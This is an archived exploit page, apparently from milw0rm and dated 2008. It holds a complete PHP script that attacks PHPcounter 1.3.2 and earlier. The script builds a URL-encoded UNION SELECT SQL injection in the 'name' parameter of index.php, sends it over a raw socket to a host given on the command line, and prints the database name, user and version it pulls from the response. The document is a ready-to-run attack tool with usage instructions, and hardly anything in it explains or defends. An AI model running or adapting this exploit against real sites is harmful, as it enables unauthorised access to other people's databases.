<html><head><title>PHPcounter <= 1.3.2 (index.php name) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q
&lt;?php

// PHPcounter &lt;= 1.3.2 Remote SQL Injection Exploit
// Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
// Discovered On: 28/09/2008
// Download: http://sourceforge.net/projects/phpcounter/

error_reporting(0);

$host = $argv[1] or banner();
$path = $argv[2] or banner();
$host = str_replace('http://',NULL,$host);

$isql = &quot;'union select 0,0,0,concat(0x24,database(),0x3a,user(),0x3a,version(),0x24)'/*&quot;;
$isql = urlencode($isql);

function banner() {
  echo &quot;[?] Usage: php $argv[0] http://example.com /cms\r\n&quot;;
  exit(0);
}

if(!$sock = fsockopen($host,80)) {
  die(&quot;Socket Error\r\n&quot;);
}

$data .= &quot;GET /$path/index.php?name=$isql HTTP/1.1\r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
$data .= &quot;Connection: close\r\n\r\n&quot;;

fputs($sock,$data);

while(!feof($sock)) {
  $content .= fgets($sock);
} fclose($sock); 


if(preg_match('/\$(.+?)\$/',$content,$out)) {
  print &quot;[+] $out[1]\r\n&quot;;
}
else {
  echo &quot;[!] Exploit Failed!\n&quot;;
}

?&gt;

# milw0rm.com [2008-09-28]</pre></html>